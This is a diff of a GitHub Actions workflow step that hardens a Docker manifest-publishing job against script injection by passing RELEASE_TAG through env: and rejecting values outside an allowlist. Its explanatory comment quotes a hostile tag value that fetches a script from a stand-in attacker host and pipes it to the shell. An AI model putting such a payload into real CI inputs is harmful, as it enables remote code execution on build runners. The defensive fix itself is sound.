@@ -94,9 +94,26 @@ jobs:
 
       - name: Create and push multi-arch manifest
         working-directory: ${{ runner.temp }}/digests
+        # RELEASE_TAG originates from workflow_dispatch inputs (attacker-
+        # controllable text) and github.event.release.tag_name (protected-tag
+        # controllable, but still string data). Interpolating it directly
+        # into the run: block with ${{ }} would splice it into the shell
+        # script the runner executes, so a tag such as
+        # ``$(curl attacker.example.com/x|sh)`` would run at build time.
+        # Pass it via env: and reference it as a shell variable, and reject
+        # anything outside the strict tag allowlist before use.
+        env:
+          RELEASE_TAG: ${{ env.RELEASE_TAG }}
+          REGISTRY: ${{ env.REGISTRY }}
+          REPO_NAME: ${{ steps.repo.outputs.name }}
         run: |
-          IMAGE="${{ env.REGISTRY }}/${{ steps.repo.outputs.name }}"
+          set -euo pipefail
+          if ! printf '%s' "$RELEASE_TAG" | grep -Eq '^[A-Za-z0-9._-]+$'; then
+            echo "Refusing to publish: RELEASE_TAG contains characters outside [A-Za-z0-9._-]" >&2
+            exit 1
+          fi
+          IMAGE="${REGISTRY}/${REPO_NAME}"
           docker buildx imagetools create \
-            --tag "${IMAGE}:${{ env.RELEASE_TAG }}" \
+            --tag "${IMAGE}:${RELEASE_TAG}" \
             --tag "${IMAGE}:latest" \
             $(printf "${IMAGE}@sha256:%s " *)
